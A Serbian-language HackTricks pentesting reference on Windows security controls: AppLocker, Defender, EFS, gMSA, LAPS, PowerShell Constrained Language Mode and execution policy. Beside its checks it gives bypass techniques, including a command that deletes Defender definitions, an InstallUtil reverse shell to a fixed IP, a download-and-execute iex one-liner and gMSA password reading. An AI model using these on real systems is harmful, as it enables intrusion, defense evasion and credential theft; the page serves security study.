# Windows bezbednosne kontrole

{{#include ../banners/hacktricks-training.md}}

## AppLocker politika

Lista dozvoljenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih datoteka koje smeju da budu prisutne i da se pokreću na sistemu. Cilj je da se okruženje zaštiti od štetnog malware-a i neodobrenog softvera koji nije u skladu sa konkretnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za stavljanje aplikacija na listu dozvoljenih** i administratorima sistema omogućava kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Pruža **detaljnu kontrolu** nad izvršnim datotekama, skriptama, Windows instalacionim datotekama, DLL-ovima, upakovanim aplikacijama i instalacionim programima upakovanih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pristup za upisivanje u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje su datoteke/ekstenzije na listi blokiranih/dozvoljenih:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` procenjuje potencijalne fajlove za određeni identitet u odnosu na AppLocker pravilo. Testirajte nalog čiji će token izvršavati payload jer pravila mogu da ciljaju korisnike ili grupe; `Get-AppLockerFileInformation` je takođe koristan za pregled putanje, hash-a i metapodataka izdavača na osnovu kojih se pravila mogu podudarati.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Pre nego što odbijeni rezultat testa protumačite kao aktivnu blokadu, proverite **efektivni režim sprovođenja pravila te kolekcije** i stanje servisa Application Identity. `AuditOnly` procenjuje pravila, ali i dalje dozvoljava izvršavanje, dok `NotConfigured` ne znači isto što i onemogućeno kada ta kolekcija sadrži pravila.<sup>[[7]](#references)</sup> Zaustavljen `AppIDSvc` sprečava sprovođenje AppLocker pravila.<sup>[[9]](#references)</sup> Ove provere pomažu da razlikujete stvarno zaobilaženje od slučaja u kojem pravilo uopšte nije blokiralo datoteku.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Za kontrolisani test izvršavanja, proverite AppLocker evidenciju događaja: **8003/8006** znače da bi EXE/DLL ili skripta/MSI bili blokirani u režimu revizije; **8004/8007** znače da su zaista blokirani. Testirajte isti tip datoteke i identitet kao u predviđenom putu izvršavanja.<sup>[[8]](#references)</sup>

Ova putanja registra sadrži konfiguracije i smernice koje primenjuje AppLocker i omogućava pregled trenutno aktivnog skupa pravila na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisne **upisive fascikle** za zaobilaženje AppLocker smernica: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **upisive fascikle** koje možete koristiti da ovo **zaobiđete**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Uobičajeno **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisano pravilo takođe može da se zaobiđe**
  - Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** — možete da napravite **folder pod nazivom `allowed`** bilo gde i biće dozvoljen.
  - Organizacije se takođe često fokusiraju na **blokiranje izvršne datoteke `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**lokacije PowerShell izvršnih datoteka**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement se veoma retko omogućava** zbog dodatnog opterećenja sistema i obima testiranja potrebnog da bi se osiguralo da se ništa neće pokvariti. Zato upotreba **DLL-ova kao backdoor-a može pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje** PowerShell koda u bilo kom procesu i zaobilaženje AppLocker-a. Više informacija potražite na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Skladištenje kredencijala

### Security Accounts Manager (SAM)

Lokalni kredencijali se nalaze u ovoj datoteci, a lozinke su heširane.

### Local Security Authority (LSA) - LSASS

**Kredencijali** (heširani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On-a.\
**LSA** upravlja lokalnom **bezbednosnom politikom** (politikom lozinki, dozvolama korisnika...), **autentifikacijom**, **pristupnim tokenima**...\
LSA je zadužen da **proveri** dostavljene kredencijale u datoteci **SAM** (za lokalnu prijavu) i da **komunicira** sa **kontrolerom domena** radi autentifikacije korisnika domena.

**Kredencijali** se **čuvaju** u **LSASS procesu**: Kerberos tiketi, NT i LM heševi, lozinke koje se lako dešifruju.

### LSA secrets

LSA može da čuva neke kredencijale na disku:

- Lozinka naloga računara iz Active Directory-ja (nedostupan kontroler domena).
- Lozinke naloga Windows servisa
- Lozinke za zakazane zadatke
- Još toga (lozinke IIS aplikacija...)

### NTDS.dit

Ovo je baza podataka Active Directory-ja. Nalazi se samo na kontrolerima domena.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je antivirusni program dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** programa **Defender**, možete da izvršite PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste saznali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Možete ga i enumerisati pomoću sledeće komande:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Šifrovani sistem datoteka (EFS)

EFS štiti datoteke šifrovanjem pomoću **simetričnog ključa** poznatog kao **ključ za šifrovanje datoteke (FEK)**. Ovaj ključ se šifruje korisnikovim **javnim ključem** i čuva u NTFS metapodacima datoteke `$EFS` (`$LOGGED_UTILITY_STREAM`), **a ne** u običnom alternativnom toku podataka `$DATA`.<sup>[[10]](#references)</sup> Kada je potrebno dešifrovanje, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata otključava FEK. Konfigurisani agent za oporavak podataka (DRA) ima zasebnu šifrovanu kopiju FEK-a u polju za oporavak podataka.<sup>[[13]](#references)</sup>

**Slučajevi dešifrovanja bez intervencije korisnika** obuhvataju:

- Kada se datoteke ili fascikle premeste na sistem datoteka koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dešifruju.
- Šifrovane datoteke koje se šalju preko mreže pomoću protokola SMB/CIFS dešifruju se pre prenosa.

Ovaj način šifrovanja omogućava vlasniku **transparentan pristup** šifrovanim datotekama. Međutim, sama promena lozinke vlasnika i prijavljivanje na sistem neće omogućiti dešifrovanje.

**Ključne napomene**:

- EFS koristi simetrični FEK, šifrovan korisnikovim javnim ključem.
- Za dešifrovanje se koristi korisnikov privatni ključ za pristup FEK-u.
- Automatsko dešifrovanje se obavlja pod određenim uslovima, na primer pri kopiranju na FAT32 ili prenosu preko mreže.
- Vlasnik može da pristupa šifrovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Nemojte zaključivati da se koristi EFS na osnovu `%APPDATA%\Microsoft\Protect`: u toj lokaciji se čuvaju glavni ključevi DPAPI-ja za mnoge Windows funkcije.<sup>[[19]](#references)</sup> Umesto toga, proverite šifrovanu datoteku komandom `cipher /c "C:\path\file"` da biste prikazali njene korisničke i oporavak sertifikate. Komandama `cipher /e` i `cipher /d` šifruju se i dešifruju datoteke za principal koji poseduje odgovarajući privatni ključ.<sup>[[11]](#references)</sup>

### Dešifrovanje EFS datoteka

Ako `cipher /c` prikaže sertifikat za oporavak, a imate njegov **odgovarajući privatni ključ DRA** u PFX datoteci, uvezite tu PFX datoteku u skladište sertifikata trenutnog korisnika, a zatim dešifrujte datoteku.<sup>[[11]](#references)[[12]](#references)</sup> Novogenerisani DRA sertifikat ne može da dešifruje starije datoteke: njegov javni ključ morao je već da bude uključen prilikom šifrovanja datoteke. Pristup putem ACL-a za NTFS ili samo resetovanje lozinke naloga ne obezbeđuju potreban privatni ključ.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Biti nalog SYSTEM

Ovaj pristup zahteva da **korisnik žrtva** ima **pokrenut** **proces** na hostu. Ako je tako, iz `meterpreter` sesije možete da se pretvarate da koristite token procesa tog korisnika (`impersonate_token` iz `incognito`). Druga mogućnost je da izvršite `migrate` u proces korisnika.

#### Znati korisničku lozinku

Mimikatz može da uveze korisnički sertifikat i privatni ključ, a zatim da ih upotrebi za dešifrovanje datoteka zaštićenih pomoću EFS-a.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** da bi pojednostavio upravljanje servisnim nalozima u IT infrastrukturi. Za razliku od tradicionalnih servisnih naloga kod kojih je često omogućena postavka „**Password never expire**“, gMSA nalozi pružaju bezbednije rešenje kojim se lakše upravlja:

- **Automatsko upravljanje lozinkom**: gMSA nalozi koriste složenu lozinku od 240 bajtova koja se obično menja svakih 30 dana. Kontroleri domena je izvode pomoću KDS ključnog materijala, čime se eliminiše potreba za ručnim ažuriranjem lozinke.<sup>[[16]](#references)[[20]](#references)</sup>
- **Poboljšana bezbednost**: Ovi nalozi ne mogu da budu zaključani i ne mogu da se koriste za interaktivne prijave, što povećava njihovu bezbednost.
- **Podrška za više hostova**: gMSA nalozi mogu da se dele na više hostova, pa su pogodni za servise koji rade na više servera.
- **Mogućnost pokretanja zakazanih zadataka**: Za razliku od managed service accounts, gMSA nalozi podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada se promene sAMaccount podaci računara ili njegovo DNS ime, čime se pojednostavljuje upravljanje SPN-om.

Kontroler domena pri čitanju konstruiše LDAP atribut _**msDS-ManagedPassword**_ pomoću lozinke izvedene iz KDS-a; ta vrednost nije nezavisno sačuvana lozinka. Obično se menja svakih 30 dana.<sup>[[20]](#references)</sup> Vraćeni [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **nije šifrovana lozinka**: njegovo polje `CurrentPassword` sadrži lozinku u čistom tekstu.<sup>[[14]](#references)</sup> Pristup se proverava prema `msDS-GroupMSAMembership`, pa su obuhvaćeni svi principi kojima su dodeljena prava za preuzimanje, a ne samo administratori ili hostovi na kojima se izvršavaju servisi.<sup>[[15]](#references)</sup> LDAP veza mora da obezbedi poverljivost, na primer putem LDAPS-a ili SASL sealing-a.<sup>[[20]](#references)</sup>

Za izvođenje lozinke van mreže nakon izlaganja KDS root key-a pogledajte [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Ovu lozinku možete da pročitate pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pronađite više informacija u ovom postu**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Takođe, pogledajte ovu [veb-stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay attack** da biste **pročitali** **lozinku** za **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Tokom enumeracije razlikujte **legacy Microsoft LAPS** od izvorne implementacije **Windows LAPS**. Windows LAPS je isporučen u ažuriranjima za Windows od 11. aprila 2023. i može da napravi rezervnu kopiju lozinke lokalnog administratora kojom upravlja, u **Windows Server Active Directory** ili **Microsoft Entra ID**. U implementacijama koje koriste AD, može i da šifruje lozinke, čuva istoriju šifrovanih lozinki i upravlja lozinkom za DSRM kontrolera domena. MSI za preuzimanje, odnosno legacy verzija, zastareo je u novijim verzijama sistema Windows, mada Windows LAPS može da radi u režimu legacy-emulation.<sup>[[6]](#references)</sup>

Pošto su legacy Microsoft LAPS i Windows LAPS zasebne implementacije, utvrdite koja je primenjena pre nego što primenite napade specifične za atribute ili cmdlet-e. Povezana stranica obrađuje otkrivanje, enumeraciju ACL-ova, preuzimanje lozinki, menjanje njihovog isteka i oporavak van mreže, bez ponavljanja tih postupaka ovde.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML zasnovani tokovi rada, PowerShell klase i drugo.

### **Provera**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` je bilo zastarelo snižavanje verzije samo na hostovima sa instaliranim opcionim PowerShell 2 engine-om. Više nije uključeno u ažurirane verzije Windows 11 24H2 ni Windows Server 2025; nemojte ga smatrati aktuelnim CLM bypass-om.<sup>[[17]](#references)</sup> Kada je uključena kontrola aplikacija, PowerShell pokreće nepouzdan kod u Constrained Language režimu, dok skripte kojima pravila veruju mogu da se pokreću u Full Language režimu.<sup>[[18]](#references)</sup>

Za starije konfiguracije možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda ćete morati da** **dodate** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete ograničeni režim. Više informacija potražite na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS politika izvršavanja

Podrazumevano je podešena na **restricted.** Glavni načini za zaobilaženje ove politike:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za komunikaciju između dve mašine. Preferirani metod za to je Kerberos. Zatim će SSPI dogovoriti koji će se protokol za autentifikaciju koristiti. Ti protokoli za autentifikaciju nazivaju se Security Support Provider (SSP), nalaze se na svakoj Windows mašini u obliku DLL-a i obe mašine moraju da podržavaju isti protokol da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani protokol
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Za veb servere i LDAP, lozinka u obliku MD5 hash-a
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za dogovaranje protokola (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
  - %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - Kontrola korisničkog naloga

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost pri aktivnostima sa povišenim privilegijama**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Zaobilaženje AppLocker-a i PowerShell režima ograničenog jezika](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [kako dešifrovati EFS datoteke](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying za gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Korišćenje AppLocker cmdlet-a za Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Pregled Windows LAPS-a](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Rad sa AppLocker pravilima](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Korišćenje Event Viewer-a uz AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Procesi i interakcije AppLocker-a](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Tokovi datoteka (lokalni sistemi datoteka)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Komanda Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Komanda Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Pravljenje rezervne kopije privatnog ključa EFS agenta za oporavak](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Atribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Zaštita grupnih upravljanih servisnih naloga](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Funkcije uklonjene iz Windows klijenta](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Korišćenje App Control-a za zaštitu PowerShell-a](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Događaj 4693 i glavni ključevi DPAPI-ja](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Konstrukcija msDS-ManagedPassword-a](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
